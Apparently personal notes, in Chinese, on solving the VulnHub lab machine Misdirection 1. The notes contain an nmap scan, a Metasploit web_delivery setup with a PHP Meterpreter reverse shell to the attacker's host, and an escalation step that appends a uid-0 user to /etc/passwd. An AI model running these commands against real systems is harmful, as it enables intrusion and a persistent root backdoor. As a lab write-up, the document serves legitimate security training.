参考资料：  
[https://gowthamaraj-rajendran.medium.com/misdirection-1-walkthrough-4a7b6f5f5074](https://gowthamaraj-rajendran.medium.com/misdirection-1-walkthrough-4a7b6f5f5074)
 
[https://www.vulnhub.com/entry/misdirection-1,371/](https://www.vulnhub.com/entry/misdirection-1,371/)
    
信息搜集  
┌──(kali㉿kali)-[~/Desktop/OSCP/Misdirection]  
└─$ sudo nmap -T5 -p- -A 192.168.163.148  
[sudo] password for kali:  
Sorry, try again.  
[sudo] password for kali:  
Starting Nmap 7.94SVN ( [https://nmap.org](https://nmap.org) ) at 2025-07-05 10:25 EDT  
Stats: 0:00:17 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan  
NSE Timing: About 99.64% done; ETC: 10:26 (0:00:00 remaining)  
Stats: 0:00:18 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan  
NSE Timing: About 99.64% done; ETC: 10:26 (0:00:00 remaining)  
Nmap scan report for 192.168.163.148  
Host is up (0.00070s latency).  
Not shown: 65531 closed tcp ports (reset)  
PORT STATE SERVICE VERSION  
22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)  
| ssh-hostkey:  
| 2048 ec:bb:44:ee:f3:33:af:9f:a5:ce:b5:77:61:45:e4:36 (RSA)  
| 256 67:7b:cb:4e:95:1b:78:08:8d:2a:b1:47:04:8d:62:87 (ECDSA)  
|_ 256 59:04:1d:25:11:6d:89:a3:6c:6d:e4:e3:d2:3c:da:7d (ED25519)  
80/tcp open http Rocket httpd 1.2.6 (Python 2.7.15rc1)  
|_http-server-header: Rocket 1.2.6 Python/2.7.15rc1  
|_http-title: Site doesn't have a title (text/html; charset=utf-8).  
3306/tcp open mysql MySQL (unauthorized)  
8080/tcp open http Apache httpd 2.4.29 ((Ubuntu))  
|_http-title: Apache2 Ubuntu Default Page: It works  
|_http-server-header: Apache/2.4.29 (Ubuntu)  
|_http-open-proxy: Proxy might be redirecting requests  
MAC Address: 00:0C:29:B2:4C:F9 (VMware)  
Device type: general purpose  
Running: Linux 3.X|4.X  
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4  
OS details: Linux 3.2 - 4.9  
Network Distance: 1 hop  
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 
TRACEROUTE  
HOP RTT ADDRESS  
1 0.70 ms 192.168.163.148
 
OS and Service detection performed. Please report any incorrect results at [https://nmap.org/submit/](https://nmap.org/submit/) .  
Nmap done: 1 IP address (1 host up) scanned in 19.58 seconds   ┌──(kali㉿kali)-[~/Desktop/OSCP/Misdirection]  
└─$   对应 22 80 8080 3306 端口
 
版本号  
- : Server banner changed from 'Rocket 1.2.6 Python/2.7.15rc1' to 'Apache/2.4.29 (Ubuntu)'.
 
8080  
[http://192.168.163.148:8080/debug/](http://192.168.163.148:8080/debug/)
  
使用msf攻击  
[https://www.hackingarticles.in/misdirection-1-vulnhub-walkthrough/](https://www.hackingarticles.in/misdirection-1-vulnhub-walkthrough/)

![[Misdirection 1 image b0bfeacad1722a5d.png|Exported image]]  
![[Misdirection 1 image 607d4929f7353bca.png|Exported image]]     

msf6 exploit(multi/script/web_delivery) \> set target 1  
target =\> 1  
msf6 exploit(multi/script/web_delivery) \> set payload php/meterpreter/reverse_tcp  
payload =\> php/meterpreter/reverse_tcp  
msf6 exploit(multi/script/web_delivery) \> set lhost 192.168.163.128  
lhost =\> 192.168.163.128  
msf6 exploit(multi/script/web_delivery) \> exploit
 
sessions 1  
shell  
python -c "import pty;pty.spawn('/bin/bash')"  
openssl passwd -1 -salt user3 pass123  
echo 'raj:$1$user3$rAGRVf5p2jYTqtqOW5cPu/:0:0::/root:/bin/bash' \>\>/etc/passwd  
tail /etc/passwd  
su raj  
pass123  
cd /root  
ls  
cat root.txt
   

cd /root  
cat root.txt 拿到root密码
   
![[Misdirection 1 image d196538df1f39181.png|Exported image]]